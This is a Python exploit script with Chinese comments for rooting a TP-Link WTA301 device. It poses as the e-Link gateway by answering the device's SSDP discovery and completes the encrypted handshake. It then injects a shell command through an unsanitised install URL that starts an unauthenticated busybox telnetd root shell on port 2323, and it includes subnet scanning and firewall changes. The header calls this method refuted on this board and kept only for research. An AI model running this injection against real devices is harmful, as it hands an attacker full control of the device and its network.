# ============================================================================
# 反面证据 —— 这条路【已被本板实测否定】，保留仅供研究，不要指望它能成功。
# 结论与证据见 ../../README.md §3.4 与 ../../docs/GETROOT-AND-NORMAL-USER-FLASH.md
# 要拿 root 请用上级目录的 rawtcp_gw.py。
# ============================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""getroot2.py —— WTA301 原厂拿 root（零硬编码）

与旧 getroot.py 的区别（旧版在中继拓扑下必失败，原因见下）：

  旧版做法：ARP 毒化网关 + 给本机加 <网关IP>/32 别名，冒充网关等设备回连 TCP 32768。
  实测拓扑：板子跑桥接中继时，192.168.1.1 是【上游/邻居的路由器】，
            既是板子的网关也是本机的网关。霸占它会同时打断自己和邻居的网络；
            而且板子的网关流量走它自己的 STA 上行，从 LAN 侧根本毒化不到。

  新版做法：板子自己在找网关，每 15 秒发一次组播：
                M-SEARCH * HTTP/1.1
                HOST:239.255.255.250:32768
                MAN:"ssdp:discover"
                MX:1
                ST:CTC_ELINK
            只要有人在 UDP 32768 上回一个带 LOCATION 的应答，板子就认它是网关
            并主动连过来（elinkclt 里还有 iptables -I INPUT -p udp --sport 32768
            -j ACCEPT ⇒ 应答必须从源端口 32768 发出）。
            所以：不毒化、不占 IP、不动上游路由器。

流程：
  1) 自动探测网卡/IP/MAC/板子（0 硬编码）
  2) UDP 32768 收 M-SEARCH → 用源端口 32768 单播回 SSDP 应答（LOCATION=本机）
  3) 板子连 TCP 32768 → elink_gw4.py 完成 DH + AES 握手
  4) 下发 ubus_call ctcapd.appd install，url 里注入 telnetd
  5) 轮询 <板子>:2323 验证 uid=0

用法：
    python getroot2.py                    # 全自动
    python getroot2.py --ip 192.168.1.175 # 指定板子
    python getroot2.py --wait 900
"""
import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)
PY = sys.executable

SRV_PORT    = int(os.environ.get('SRV_PORT', '8099'))
SHELL_PORT  = int(os.environ.get('SHELL_PORT', '2323'))
ELINK_PORT  = int(os.environ.get('ELINK_PORT', '32768'))
MCAST_GRP   = '239.255.255.250'
LOG = os.path.join(HERE, 'getroot2.log')


def log(*a):
    s = ' '.join(str(x) for x in a)
    line = time.strftime('[%H:%M:%S] ') + s
    print(line, flush=True)
    with open(LOG, 'a', encoding='utf-8') as f:
        f.write(line + '\n')


def sh(*a):
    try:
        r = subprocess.run(a, capture_output=True, timeout=30)
        for enc in ('gbk', 'utf-8'):
            try:
                return r.stdout.decode(enc)
            except Exception:
                pass
        return r.stdout.decode('gbk', 'replace')
    except Exception:
        return ''


# ---------------------------------------------------------- 1. 自动探测（零硬编码）
def detect():
    """返回 dict(iface, my_ip, my_mac, gw_ip, prefix) —— 全部现场探测。"""
    info = {}
    ps = ("Get-NetIPConfiguration | Where-Object {$_.IPv4Address -and "
          "$_.NetAdapter.Status -eq 'Up'} | ForEach-Object { "
          "'{0}|{1}|{2}|{3}' -f $_.InterfaceAlias,$_.InterfaceIndex,"
          "$_.IPv4Address.IPAddress,$_.IPv4DefaultGateway.NextHop }")
    out = sh('powershell', '-NoProfile', '-Command', ps)
    cands = []
    for line in out.splitlines():
        line = line.strip()
        if not line or '|' not in line:
            continue
        parts = line.split('|')
        if len(parts) < 4:
            continue
        alias, idx, ip, gw = parts[0], parts[1], parts[2], parts[3]
        # 排除虚拟网卡
        if re.search(r'WSL|Tailscale|VMware|VirtualBox|Loopback|vEthernet', alias, re.I):
            continue
        cands.append((alias, idx, ip, gw))
    if not cands:
        raise SystemExit('!! 找不到可用的物理网卡（需要已连上板子的 wifi/网线）')

    # 优先级：有默认网关的优先（板子做中继时本机网关是上游路由器）
    cands.sort(key=lambda c: (c[3] == '',))
    alias, idx, ip, gw = cands[0]
    info.update(iface=alias, ifindex=idx, my_ip=ip, gw_ip=gw)

    mac = ''
    try:
        m = sh('powershell', '-NoProfile', '-Command',
               "(Get-NetAdapter -InterfaceIndex %s).MacAddress" % idx).strip()
        if re.match(r'^([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}$', m):
            mac = m.replace('-', ':').upper()
    except Exception:
        pass
    info['my_mac'] = mac

    # 找板子：同网段里 HTTP 80/443 开着、且 MAC 是 TP-Link OUI 的主机
    info['subnet'] = '.'.join(ip.split('.')[:3]) + '.'
    return info


def find_board(info, hint=None):
    """同网段扫 HTTP。返回 (ip, mac)。"""
    if hint:
        return hint, arp_mac(hint)
    sub = info['subnet']
    me = info['my_ip']
    log('扫描 %s0/24 找 WTA301（HTTP 80/443）…' % sub)
    found = []
    lock = threading.Lock()

    def probe(n):
        ip = sub + str(n)
        if ip == me:
            return
        for port in (80, 443):
            try:
                s = socket.create_connection((ip, port), 0.6)
                s.close()
                with lock:
                    found.append(ip)
                return
            except Exception:
                pass

    ths = []
    for n in range(1, 255):
        t = threading.Thread(target=probe, args=(n,), daemon=True)
        t.start()
        ths.append(t)
        if len(ths) % 60 == 0:
            time.sleep(0.05)
    for t in ths:
        t.join(6)

    if not found:
        raise SystemExit('!! 同网段没有找到开 HTTP 的主机')

    # 用 MAC OUI 筛 TP-Link（98:97:CC / C0:06:C3 / 等），读不到就全返回让用户挑
    tp = []
    for ip in found:
        mac = arp_mac(ip) or ''
        if re.match(r'^(98:97:CC|C0:06:C3|3C:84:6A|50:C7:BF|14:CC:20|A4:2B:B0)', mac.upper()):
            tp.append((ip, mac))
    if len(tp) == 1:
        return tp[0]
    if tp:
        log('发现多个 TP-Link 设备：', tp)
        return tp[0]
    log('候选（读不到 MAC 或非 TP-Link OUI）：', found)
    return found[0], arp_mac(found[0]) or ''


def arp_mac(ip):
    sh('ping', '-n', '1', '-w', '800', ip)
    out = sh('arp', '-a', ip)
    m = re.search(r'(' + re.escape(ip) + r')\s+([0-9a-fA-F-]{17})', out)
    if m:
        return m.group(2).replace('-', ':').upper()
    return ''


# ---------------------------------------------------------- 2. SSDP 应答器
class SsdpResponder(threading.Thread):
    """收 M-SEARCH(32768) → 从源端口 32768 单播回 SSDP 应答。

    应答必须带 LOCATION（elinkclt 里 `LOCATION:` → `(ssdp) gw ip %s`），
    且源端口必须是 32768（elinkclt 自己插的 iptables 规则只放行 --sport 32768）。
    """

    def __init__(self, my_ip):
        super().__init__(daemon=True)
        self.my_ip = my_ip
        self.hits = 0
        self.replied = 0
        self.stop_flag = False

    def run(self):
        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # 让它能收组播
        try:
            sk.setsockopt(socket.SOL_SOCKET, getattr(socket, 'SO_REUSEPORT', 15), 1)
        except Exception:
            pass
        sk.bind(('0.0.0.0', ELINK_PORT))
        mreq = struct.pack('4s4s', socket.inet_aton(MCAST_GRP), socket.inet_aton('0.0.0.0'))
        try:
            sk.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            log('SSDP: 已加入组播 %s:%d' % (MCAST_GRP, ELINK_PORT))
        except Exception as e:
            log('SSDP: 加入组播失败（仍能收到单播）:', e)
        sk.settimeout(1.0)

        body = ('HTTP/1.1 200 OK\r\n'
                'CACHE-CONTROL: max-age=1800\r\n'
                'EXT:\r\n'
                'LOCATION: http://%s:%d/elink.xml\r\n'
                'SERVER: Linux/3.10 UPnP/1.0 E-Link/1.0\r\n'
                'ST: CTC_ELINK\r\n'
                'USN: uuid:elink::%s\r\n'
                '\r\n') % (self.my_ip, SRV_PORT, self.my_ip)

        while not self.stop_flag:
            try:
                data, addr = sk.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception:
                break
            txt = data.decode('utf-8', 'replace')
            if 'M-SEARCH' in txt or 'CTC_ELINK' in txt:
                self.hits += 1
                log('SSDP: 收到 M-SEARCH from %s:%d (#%d)' % (addr[0], addr[1], self.hits))
                try:
                    # 从同一个 socket 发 ⇒ 源端口天然是 32768
                    sk.sendto(body.encode(), addr)
                    self.replied += 1
                    log('SSDP: 已回应 → %s:%d (LOCATION=%s:%d)' % (addr[0], addr[1], self.my_ip, SRV_PORT))
                except Exception as e:
                    log('SSDP: 回应失败', e)
        sk.close()


# ---------------------------------------------------------- 3. 支撑
def port_open(ip, port, t=1.0):
    try:
        socket.create_connection((ip, port), t).close()
        return True
    except Exception:
        return False


def verify_root(ip):
    try:
        s = socket.create_connection((ip, SHELL_PORT), 8)
    except Exception as e:
        return False, repr(e)
    s.settimeout(6)
    time.sleep(1.5)
    try:
        s.recv(65535)
    except Exception:
        pass
    try:
        s.sendall(b'id; uname -a\n')
        time.sleep(1.8)
        out = s.recv(65535)
    except Exception as e:
        out = b''
    s.close()
    txt = out.decode('utf-8', 'replace')
    return ('uid=0' in txt or 'root' in txt), txt.strip()[:400]


def firewall_open(ports):
    """放行入站（必须 New-NetFirewallRule，netsh 会被引号拆坏）。"""
    for p in ports:
        for proto in ('TCP', 'UDP'):
            sh('powershell', '-NoProfile', '-Command',
               "if (-not (Get-NetFirewallRule -DisplayName 'WTA301-getroot-%d-%s' "
               "-ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName "
               "'WTA301-getroot-%d-%s' -Direction Inbound -Action Allow "
               "-Protocol %s -LocalPort %d -Profile Any | Out-Null }" % (p, proto, p, proto, proto, p))
    log('防火墙：已放行 TCP/UDP %s' % ','.join(str(p) for p in ports))


def spawn(args, tag):
    logf = open(os.path.join(HERE, tag + '.log'), 'a', encoding='utf-8', errors='replace')
    p = subprocess.Popen([PY] + args, stdout=logf, stderr=subprocess.STDOUT,
                         cwd=HERE, env=os.environ.copy())
    log('启动 %s (pid %d)' % (tag, p.pid))
    return p


def kill_port(port):
    out = sh('powershell', '-NoProfile', '-Command',
             "Get-NetTCPConnection -LocalPort %d -State Listen -ErrorAction SilentlyContinue | "
             "Select-Object -ExpandProperty OwningProcess" % port)
    for pid in set(out.split()):
        if pid.isdigit():
            sh('taskkill', '/F', '/PID', pid)
            log('清掉占用 %d 的进程 %s' % (port, pid))


def payload(my_ip):
    """注入点：appd 拼 wget 命令行时 URL 未过 ; ⇒ 直接注入 shell。"""
    return 'http://%s:%d/x;(/bin/busybox telnetd -l /bin/sh -p %d >/dev/null 2>&1 &);' % (
        my_ip, SRV_PORT, SHELL_PORT)


# ---------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--ip', default=os.environ.get('WTA_HOST'))
    ap.add_argument('--wait', type=int, default=900, help='等待秒数（M-SEARCH 15s 一轮）')
    ap.add_argument('--keep', action='store_true', help='成功后不杀后台进程')
    a = ap.parse_args()

    log('=' * 60)
    info = detect()
    for k in ('iface', 'ifindex', 'my_ip', 'my_mac', 'gw_ip', 'subnet'):
        log('  %-8s = %s' % (k, info.get(k)))

    ip, mac = find_board(info, a.ip)
    log('板子 = %s  MAC = %s' % (ip, mac))

    if port_open(ip, SHELL_PORT):
        ok, tail = verify_root(ip)
        if ok:
            log('=== 2323 已经开着且是 root：telnet %s %d ===' % (ip, SHELL_PORT))
            log(tail)
            return 0

    firewall_open([ELINK_PORT, SRV_PORT, SHELL_PORT])

    # 1) HTTP（注入后 telnetd 起来用；也让 LOCATION 的 URL 有东西可指）
    kill_port(SRV_PORT)
    srv = spawn(['srv.py', '--port', str(SRV_PORT)], 'srv')
    time.sleep(1)
    try:
        urllib.request.urlopen('http://%s:%d/x' % (info['my_ip'], SRV_PORT), timeout=3)
        log('HTTP 服务 OK http://%s:%d' % (info['my_ip'], SRV_PORT))
    except Exception as e:
        log('!! HTTP 服务异常:', repr(e))

    # 2) SSDP 应答器（UDP 32768）
    resp = SsdpResponder(info['my_ip'])
    resp.start()
    time.sleep(0.5)

    # 3) e-Link 网关模拟器（TCP 32768）
    kill_port(ELINK_PORT)
    pl = payload(info['my_ip'])
    log('注入载荷: %s' % pl)
    env_backup = dict(os.environ)
    os.environ['ELINK_PORT'] = str(ELINK_PORT)
    gw = spawn(['elink_gw4.py', str(a.wait), 'ctcapd.appd', 'install',
                json.dumps({'url': pl})], 'elink')
    os.environ.clear()
    os.environ.update(env_backup)
    time.sleep(1)

    log('等待板子连过来（板子 15 秒发一次 M-SEARCH）…')
    t0 = time.time()
    last_note = 0
    while time.time() - t0 < a.wait:
        if port_open(ip, SHELL_PORT):
            time.sleep(2)
            ok, tail = verify_root(ip)
            if ok:
                log('=' * 60)
                log('=== 成功！root shell: telnet %s %d ===' % (ip, SHELL_PORT))
                log(tail)
                if not a.keep:
                    resp.stop_flag = True
                    for p_, n_ in ((gw, 'elink'), (srv, 'srv')):
                        try:
                            p_.terminate()
                            log('已停止', n_)
                        except Exception:
                            pass
                return 0
            log('2323 开了但验证异常:', tail)
        if time.time() - last_note > 30:
            last_note = time.time()
            log('…已等 %ds  M-SEARCH 收到 %d 次 / 已回应 %d 次' %
                (time.time() - t0, resp.hits, resp.replied))
        time.sleep(3)

    log('!! 超时。排查：')
    log('   1) elink.log —— 若空，说明板子没连 TCP %d（SSDP 应答没被接受）' % ELINK_PORT)
    log('   2) 看 SSDP 计数：hits=%d replied=%d' % (resp.hits, resp.replied))
    log('   3) 防火墙是否放行 UDP/TCP %d' % ELINK_PORT)
    return 1


if __name__ == '__main__':
    sys.exit(main())
